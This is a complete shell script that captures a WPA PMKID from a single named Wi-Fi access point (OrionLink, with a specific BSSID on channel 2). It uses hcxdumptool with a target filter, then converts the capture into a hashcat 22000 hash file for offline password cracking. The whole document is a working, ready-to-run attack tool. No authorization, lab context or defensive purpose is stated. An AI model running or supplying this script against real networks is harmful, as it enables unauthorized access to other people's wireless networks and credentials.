#!/bin/sh
# PMKID Capture Script
# Target: OrionLink CC:28:AA:66:30:08, Channel 2
# Uses hcxdumptool to capture PMKID (no client needed)

IFACE="wlan1mon"
BSSID="CC:28:AA:66:30:08"
CHAN="2"
OUTFILE="/tmp/orionlink_pmkid.pcapng"
LOG="/tmp/pmkid_capture.log"

echo "=== PMKID Capture ===" | tee "$LOG"
echo "Target: OrionLink ($BSSID) Ch$CHAN" | tee -a "$LOG"
echo "Started: $(date)" | tee -a "$LOG"

# Clean old files
rm -f "$OUTFILE" /tmp/orionlink_pmkid* 2>/dev/null

# Create filterlist (target BSSID only)
echo "$BSSID" | tr -d ':' > /tmp/pmkid_filter.txt
echo "[*] Filter: $(cat /tmp/pmkid_filter.txt)" | tee -a "$LOG"

# Run hcxdumptool to capture PMKID
# --enable_status=1 : show status
# -c $CHAN : lock to channel
# --filterlist_ap : only target our AP
# --filtermode=2 : whitelist mode (only listed APs)
echo "[*] Running hcxdumptool (60s timeout)..." | tee -a "$LOG"

hcxdumptool -i "$IFACE" -o "$OUTFILE" -c "$CHAN" --enable_status=1 --filterlist_ap=/tmp/pmkid_filter.txt --filtermode=2 > /tmp/hcxdump.out 2>&1 &
HCX_PID=$!
echo "[*] hcxdumptool PID: $HCX_PID" | tee -a "$LOG"

# Wait up to 60 seconds
WAITED=0
while [ "$WAITED" -lt 60 ] && kill -0 "$HCX_PID" 2>/dev/null; do
    sleep 5
    WAITED=$((WAITED + 5))
    echo "[*] Waiting... ${WAITED}s" | tee -a "$LOG"
    # Check if we got a PMKID
    if [ -f "$OUTFILE" ]; then
        SIZE=$(ls -la "$OUTFILE" 2>/dev/null | awk '{print $5}')
        if [ "$SIZE" -gt 500 ] 2>/dev/null; then
            echo "[+] Capture file growing: $SIZE bytes" | tee -a "$LOG"
        fi
    fi
done

# Kill hcxdumptool
kill "$HCX_PID" 2>/dev/null
sleep 2
kill -9 "$HCX_PID" 2>/dev/null
wait "$HCX_PID" 2>/dev/null

echo "[*] hcxdumptool output:" | tee -a "$LOG"
cat /tmp/hcxdump.out | tee -a "$LOG"

# Check capture file
if [ -f "$OUTFILE" ]; then
    SIZE=$(ls -la "$OUTFILE" | awk '{print $5}')
    echo "[+] Capture file: $OUTFILE ($SIZE bytes)" | tee -a "$LOG"

    # Convert to hashcat format
    echo "[*] Converting with hcxpcapngtool..." | tee -a "$LOG"
    hcxpcapngtool -o /tmp/orionlink_pmkid.22000 "$OUTFILE" 2>&1 | tee -a "$LOG"

    if [ -f /tmp/orionlink_pmkid.22000 ]; then
        echo "[+] Hashcat hash file created:" | tee -a "$LOG"
        cat /tmp/orionlink_pmkid.22000 | tee -a "$LOG"
        echo "" | tee -a "$LOG"
        LINES=$(wc -l < /tmp/orionlink_pmkid.22000)
        echo "[+] $LINES hash(es) extracted" | tee -a "$LOG"
    else
        echo "[-] No PMKID/handshake extracted" | tee -a "$LOG"
    fi
else
    echo "[-] No capture file generated" | tee -a "$LOG"
fi

echo "Completed: $(date)" | tee -a "$LOG"
